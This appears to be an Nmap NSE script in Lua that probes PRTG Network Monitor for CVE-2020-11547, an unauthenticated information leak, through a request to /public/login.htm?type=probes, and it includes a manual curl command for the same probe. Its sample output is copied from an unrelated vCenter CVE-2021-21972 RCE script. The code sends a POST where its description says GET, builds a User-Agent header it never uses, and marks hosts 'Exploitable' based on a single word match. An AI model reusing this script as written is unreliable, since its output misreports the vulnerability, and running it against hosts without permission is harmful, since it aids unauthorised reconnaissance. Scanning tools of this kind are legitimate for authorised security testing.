description = [[
TestCVE-2020-11547
Manual inspection: 
# curl -i -s -k -X $'GET' 
-H $'Host: <target>' 
-H $'User-Agent: test'
$'http://<target>/public/login.htm?type=probes'

References: 
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11547'
https://cve.circl.lu/cve/CVE-2020-11547
]]

---
-- @usage
-- nmap -p443 --script CVE-2020-11547.nse <target>
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | CVE-2021-21972: 
-- |   VULNERABLE:
-- |   vCenter 6.5-7.0 RCE
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2021-21972
-- |       The vSphere Client (HTML5) contains a remote code execution vulnerability in a vCenter Server plugin. 
-- |       A malicious actor with network access to port 443 may exploit this issue to execute commands with 
-- |       unrestricted privileges on the underlying operating system that hosts vCenter Server.
-- |     Disclosure date: 2021-02-23
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-21972


author = "Ismail Erkek"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

portrule = shortport.http

action = function(host, port)

    local vuln = {
        title = "PRTG Network Monitor Information Disclosure",
        state = vulns.STATE.NOT_VULN,
        IDS = { CVE = 'CVE-2020-11547' },
		description = [[
PRTG Network Monitor before 20.1.57.1745 allows remote unauthenticated attackers to obtain information about probes 
running or the server itself (CPU usage, memory, Windows version, and internal statistics) via an HTTP request, as 
demonstrated by type=probes to login.htm or index.htm.]], 
		
		references = {
           'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11547'
       },
       dates = {
           disclosure = {year = '2020', month = '04', day = '04'},
       },

    }   
    
    local report = vulns.Report:new(SCRIPT_NAME, host, port)

    local uri = "/public/login.htm?type=probes"
    
    local options = {header={}}
    options['header']['User-Agent'] = "Mozilla/5.0 (compatible; vCenter)"

    local response = http.post(host, port, uri)

    if ( response.status == 200 ) then
    
    local title = string.match(response.body, "Probe")

        if (title == "Probe") then
        	vuln.state = vulns.STATE.EXPLOIT
        else 
      		vuln.state = vulns.STATE.NOT_VULN
      	end 

    end

    return report:make_output (vuln)
end